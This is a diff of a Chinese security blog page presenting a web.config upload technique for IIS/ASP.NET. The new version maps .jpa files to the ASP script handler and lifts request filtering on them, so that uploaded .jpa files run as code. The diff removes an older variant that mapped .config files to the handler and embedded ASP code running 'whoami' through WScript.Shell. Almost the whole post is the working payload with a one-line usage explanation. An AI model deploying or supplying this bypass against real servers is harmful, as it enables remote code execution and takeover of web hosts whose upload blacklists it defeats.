@@ -3,7 +3,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
-    <title>Web.config RCE « 倾旋的博客</title>
+    <title>ASP.NET 文件上传黑名单解决办法 « 倾旋的博客</title>
     <meta name="description" content="倾旋的博客">
     <meta name="author" content='倾旋'>
 
@@ -49,19 +49,20 @@
 <nav><a href="/" class="all-posts-link">‹ All Posts</a></nav><div id="content">
 
 <div class="container">
-    <h1>Web.config RCE</h1>
-    <h2 id="webconfig">Web.config</h2>
+    <h1>ASP.NET 文件上传黑名单解决办法</h1>
+    <h2 id="aspnet-文件上传黑名单解决办法">ASP.NET 文件上传黑名单解决办法</h2>
 <p>来源：https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/</p>
+<p>同过上传web.config配置文件可以使得任意扩展名的文件以脚本代码运行</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 <span style="color:#f92672">&lt;configuration&gt;</span>
    <span style="color:#f92672">&lt;system.webServer&gt;</span>
       <span style="color:#f92672">&lt;handlers</span> <span style="color:#a6e22e">accessPolicy=</span><span style="color:#e6db74">&#34;Read, Script, Write&#34;</span><span style="color:#f92672">&gt;</span>
-         <span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;web_config&#34;</span> <span style="color:#a6e22e">path=</span><span style="color:#e6db74">&#34;*.config&#34;</span> <span style="color:#a6e22e">verb=</span><span style="color:#e6db74">&#34;*&#34;</span> <span style="color:#a6e22e">modules=</span><span style="color:#e6db74">&#34;IsapiModule&#34;</span> <span style="color:#a6e22e">scriptProcessor=</span><span style="color:#e6db74">&#34;%windir%\system32\inetsrv\asp.dll&#34;</span> <span style="color:#a6e22e">resourceType=</span><span style="color:#e6db74">&#34;Unspecified&#34;</span> <span style="color:#a6e22e">requireAccess=</span><span style="color:#e6db74">&#34;Write&#34;</span> <span style="color:#a6e22e">preCondition=</span><span style="color:#e6db74">&#34;bitness64&#34;</span> <span style="color:#f92672">/&gt;</span>
+         <span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;web_config&#34;</span> <span style="color:#a6e22e">path=</span><span style="color:#e6db74">&#34;*.jpa&#34;</span> <span style="color:#a6e22e">verb=</span><span style="color:#e6db74">&#34;*&#34;</span> <span style="color:#a6e22e">modules=</span><span style="color:#e6db74">&#34;IsapiModule&#34;</span> <span style="color:#a6e22e">scriptProcessor=</span><span style="color:#e6db74">&#34;%windir%\system32\inetsrv\asp.dll&#34;</span> <span style="color:#a6e22e">resourceType=</span><span style="color:#e6db74">&#34;Unspecified&#34;</span> <span style="color:#a6e22e">requireAccess=</span><span style="color:#e6db74">&#34;Write&#34;</span> <span style="color:#a6e22e">preCondition=</span><span style="color:#e6db74">&#34;bitness64&#34;</span> <span style="color:#f92672">/&gt;</span>
       <span style="color:#f92672">&lt;/handlers&gt;</span>
       <span style="color:#f92672">&lt;security&gt;</span>
          <span style="color:#f92672">&lt;requestFiltering&gt;</span>
             <span style="color:#f92672">&lt;fileExtensions&gt;</span>
-               <span style="color:#f92672">&lt;remove</span> <span style="color:#a6e22e">fileExtension=</span><span style="color:#e6db74">&#34;.config&#34;</span> <span style="color:#f92672">/&gt;</span>
+               <span style="color:#f92672">&lt;remove</span> <span style="color:#a6e22e">fileExtension=</span><span style="color:#e6db74">&#34;.jpa&#34;</span> <span style="color:#f92672">/&gt;</span>
             <span style="color:#f92672">&lt;/fileExtensions&gt;</span>
             <span style="color:#f92672">&lt;hiddenSegments&gt;</span>
                <span style="color:#f92672">&lt;remove</span> <span style="color:#a6e22e">segment=</span><span style="color:#e6db74">&#34;web.config&#34;</span> <span style="color:#f92672">/&gt;</span>
@@ -72,19 +73,8 @@
    <span style="color:#f92672">&lt;appSettings&gt;</span>
 <span style="color:#f92672">&lt;/appSettings&gt;</span>
 <span style="color:#f92672">&lt;/configuration&gt;</span>
-<span style="color:#75715e">&lt;!–
-</span><span style="color:#75715e">&lt;% Response.write(&#34;-&#34;&amp;&#34;-&gt;</span>&#34;)
-Response.write(&#34;<span style="color:#f92672">&lt;/p&gt;</span>
-<span style="color:#f92672">&lt;pre&gt;</span>&#34;)<span style="color:#f92672">&lt;/p&gt;</span>
-<span style="color:#f92672">&lt;p&gt;</span>Set wShell1 = CreateObject(&#34;WScript.Shell&#34;)
-Set cmd1 = wShell1.Exec(&#34;whoami&#34;)
-output1 = cmd1.StdOut.Readall()
-set cmd1 = nothing: Set wShell1 = nothing<span style="color:#f92672">&lt;/p&gt;</span>
-<span style="color:#f92672">&lt;p&gt;</span>Response.write(output1)
-Response.write(&#34;<span style="color:#f92672">&lt;/pre&gt;</span>
-<span style="color:#f92672">&lt;p&gt;</span><span style="color:#75715e">&lt;!-&#34;&amp;&#34;-&#34;) %&gt;</span>
-–&gt;
-</code></pre></div>
+</code></pre></div><p>上传完成web.config到Web目录下后，可以再上传<code>*.jpa</code>的扩展名文件达到执行任意代码的目的。</p>
+
 </div>
 <div class="container">
     <section class="bio" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
